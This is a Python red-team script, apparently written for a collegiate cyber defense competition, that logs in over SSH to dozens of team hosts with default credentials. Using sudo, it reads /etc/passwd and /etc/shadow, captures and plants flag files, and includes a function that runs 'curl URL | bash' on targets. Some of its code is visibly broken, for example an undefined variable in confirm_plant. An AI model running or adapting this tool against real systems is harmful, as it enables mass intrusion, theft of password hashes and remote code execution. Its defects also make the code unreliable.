import os
import subprocess
import sys
import shlex
import time
import re

def capture_flag(host, path, user, pw, sudo=False):
    if sudo == False:
        args = shlex.split(
                ("timeout 30 sshpass -p %s ssh -o 'StrictHostKeyChecking no' " +
                "%s@%s 'cat /etc/passwd %s*flag*'") %
                (pw, user, host, path))
    else:
        args = shlex.split(
                ("timeout 30 sshpass -p %s ssh -o 'StrictHostKeyChecking no' " +
                "%s@%s 'echo %s | sudo -S cat /etc/passwd %s*flag*'") %
                (pw, user, pw, host, path))
        
    return subprocess.Popen(args, stderr=subprocess.PIPE, 
            stdout=subprocess.PIPE)

def plant_flag(host, path, user, pw, flag, sudo=False):
    if sudo == False:
        args = shlex.split(
                "timeout 30 sshpass -p %s ssh -o 'StrictHostKeyChecking no' " +
                "%s@%s 'echo %s > %s; cat %s'" %
                (pw, user, host, flag, path, path))
    else:
        args = shlex.split(
                ("timeout 30 sshpass -p %s ssh -o 'StrictHostKeyChecking no' " +
                "%s@%s 'echo %s > .tMpReDLOL; " +
                    "echo %s | sudo mv .tMpReDLOL %s; echo %s | " +
                    "sudo cat /etc/shadow %s'") %
                (pw, user, host, flag, pw, path, pw, path))

    return subprocess.Popen(args, stderr=subprocess.PIPE, 
            stdout=subprocess.PIPE)

def extra_pipebash(host, user, pw, url):
    args = shlex.split(
            "timeout 30 sshpass -p %s ssh -o 'StrictHostKeyChecking no' " +
            "%s@%s 'curl %s | bash'" % 
            (pw, user, host, url))
    return subprocess.Popen(args, stderr=subprocess.PIPE, 
            stdout=subprocess.PIPE)

def confirm_capture(cap):
    proc = cap[3]
    host = cap[1]

    passwd_re = re.compile('.*:.*')

    data = proc.stdout.read().decode('utf-8')

    with open("output/%s/cap_stdout" % str(cap[0]), "w") as f:
        f.write(data)

    with open("output/%s/cap_stderr" % str(cap[0]), "w") as f:
        f.write(proc.stderr.read())

    if data:
        flag = data.splitlines()[-1]
        if not passwd_re.match(flag):
            print("Got flag for %s: %s" % (host, flag))
            with open("output/%s/passwd" % str(cap[0]), "w") as f:
                f.write("\n".join(data.splitlines()[0:-1]))
            with open("output/%s/flag_%s" % (str(cap[0]), cap[2]), "w") as f:
                f.write("\n".join(data.splitlines()[0:-1]))

            return True
        else:
            print("Flag not captured for %s: %s" % (host, flag))
            with open("output/%s/flag_%s" % (str(cap[0]), cap[2]), "w") as f:
                f.write("Flag missing!\n")
            with open("output/%s/passwd" % str(cap[0]), "w") as f:
                f.write(data)

    elif proc.returncode == 124:
        print("Timed out for %s" % host)
    else: 
        print("Something weird happened planting flag for %s (%d)" % 
                (host, proc.returncode))
        print("Stderr: %s" % proc.stderr.read().decode('utf-8'))

    return False

def confirm_plant(plant):
    proc = plant[3]
    host = plant[1]

    data = proc.stdout.read().decode('utf-8')

    with open("output/%s/plant_data" % str(plant[0]), "w") as f:
        f.write(data)

    with open("output/%s/cap_stderr" % str(cap[0]), "w") as f:
        f.write(proc.stderr.read())

    if data:
        flag = data.splitlines()[-1]
        if flag[0:10] == plant[4][0:10]:
            print("Flag planted for %s: %s" % (host, flag))
            with open("output/%s/shadow" % str(cap[0]), "w") as f:
                f.write("\n".join(data.splitlines()[0:-1]))

            return True
        else:
            print("Flag not planted for %s: %s" % (host, flag))
            with open("output/%s/shadow" % str(cap[0]), "w") as f:
                f.write(data)

    elif proc.returncode == 124:
        print("Timed out for %s" % host)
    else: 
        print("Something weird happened planting flag for %s, (%d)" % 
            (host, proc.returncode))
        print("Stderr: %s" % proc.stderr.read().decode('utf-8'))

    return False

stack_host = '192.168.122.184'
stack_user = 'stack'
stack_pw = 'not_stack'

flag_plant = 'this_is_the_red_flag'
path = '/home/stack/'
plant_path = '/etc/rdflg'

captures = []
plants = []

for i in range(1, 40):
    team = "team%d" % i
    rdflg = "RED ROCKS LOL THIS NEEDS TO BE LONGER"

    host = "www.%s.isucdc.com" % team
    try:
        rdflg = open("team%d/team%d_www-usr.flag" % (i, i), "r").read()
    except IOError:
        pass
    captures.append((i, host, 'root', capture_flag(host,
        '/root/', 'cdc', 'cdc', True)))
    plants.append((i, host, 'usr', plant_flag(host,
        '/usr/RED_ROCKS', 'cdc', 'cdc', rdflg, True), rdflg))

    host = "boa.%s.isucdc.com" % team
    try:
        rdflg = open("team%d/team%d_gradeboa-usr.flag" % (i, i), "r").read()
    except IOError:
        pass
    captures.append((i, host, 'etc', capture_flag(host,
        '/etc/', 'cdc', 'cdc')))
    plants.append((i, host, 'usr', plant_flag(host,
        '/usr/RED_ROCKS', 'cdc', 'cdc', rdflg, True), rdflg))

captured = 0
planted = 0
while len(captures) or len(plants):
    for cap in captures:
        if cap[3].poll() is not None:
            print("Confirming capture for team %s %s (%s)" %
                    (str(cap[0]), cap[2], cap[1]))
            if confirm_capture(cap):
                captured += 1
            captures.remove(cap)
    for plant in plants:
        if plant[3].poll() is not None:
            print("Confirming plant for team %s %s (%s)" %
                    (str(plant[0]), plant[2], plant[1]))
            if confirm_plant(plant):
                planted += 1
            plants.remove(plant)


print("Done! %d flags captured, %d flags planted" % (captured, planted))
